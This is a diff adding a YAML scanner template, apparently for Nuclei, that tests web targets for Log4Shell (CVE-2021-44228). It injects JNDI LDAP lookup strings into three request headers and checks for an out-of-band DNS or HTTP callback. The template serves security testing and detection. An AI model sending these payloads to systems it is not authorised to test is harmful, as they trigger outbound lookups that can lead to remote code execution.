@@ -1,0 +1,29 @@
+id: whai-rce-log4shell
+
+info:
+  name: Log4Shell (CVE-2021-44228)
+  author: whitehat-ai
+  severity: critical
+  description: Tests for Log4Shell via JNDI lookup in headers
+  tags: log4j,rce,java,critical
+  classification:
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-917
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      User-Agent: "${jndi:ldap://{{interactsh-url}}}"
+      X-Forwarded-For: "${jndi:ldap://{{interactsh-url}}}"
+      Referer: "${jndi:ldap://{{interactsh-url}}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
